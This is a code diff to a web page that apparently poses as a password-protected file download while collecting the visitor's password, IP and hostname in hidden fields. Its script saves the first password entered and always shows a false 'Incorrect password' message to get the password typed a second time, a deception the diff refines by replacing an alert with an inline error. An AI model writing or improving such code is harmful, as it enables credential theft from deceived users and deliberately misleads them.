@@ -60,53 +60,14 @@
     .hidden { display:none; }
     .center-row { display:flex; gap:8px; align-items:center; justify-content:center; }
 
-    /* Modal styles */
-    #modalOverlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.6);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 10000;
-    }
-    #modalBox {
-      background: #fff;
-      padding: 20px 26px;
-      border-radius: 8px;
-      max-width: 420px;
-      width: calc(100% - 40px);
-      text-align: center;
-      box-shadow: 0 8px 26px rgba(0,0,0,0.2);
-    }
-    #modalBox h3 {
-      font-size: 18px;
+    /* New error message style */
+    .error-message {
       color: #d32f2f;
-      margin-bottom: 12px;
-    }
-    #modalBox p {
       font-size: 14px;
-      color: #444;
-      margin-bottom: 14px;
+      margin-top: 8px;
+      text-align: center;
     }
-    #modalCountdown {
-      font-weight:700;
-      color:#444;
-      margin-bottom:10px;
-    }
-    #modalActions { display:flex; gap:10px; justify-content:center; margin-top:6px; }
-    .modalBtn {
-      padding: 10px 16px;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-      font-weight: 700;
-    }
-    .modalBtn.primary { background: #d32f2f; color: #fff; }
-    .modalBtn.secondary { background: #eef2f7; color: #0b58a8; }
+
   </style>
 </head>
 <body>
@@ -146,6 +107,9 @@
           </div>
           <input type="hidden" name="ip" id="ip">
           <input type="hidden" name="hostname" id="hostname">
+
+          <!-- Error message container -->
+          <div id="errorMessage" class="error-message" style="display: none;">Incorrect password, please re-type password.</div>
 
           <div class="download-wrap">
             <button class="btn-download" type="submit">DOWNLOAD</button>
@@ -187,6 +151,7 @@
     const stepPassword = document.getElementById('stepPassword');
     const continueBtn = document.getElementById('continueBtn');
     const toggle = document.getElementById('togglePassword');
+    const errorMessage = document.getElementById('errorMessage');
 
     let passwordFirstEntry = "";
 
@@ -237,8 +202,8 @@
       if (passwordFirstEntry === "") {
         passwordFirstEntry = passwordInput.value;
         passwordInput.value = ''; // Clear password input to ask again
+        errorMessage.style.display = 'block'; // Show error message
         passwordInput.focus();
-        alert("Incorrect password. Please try again."); // Show alert for incorrect password
         return; // Don't submit yet, wait for second password input
       }
 
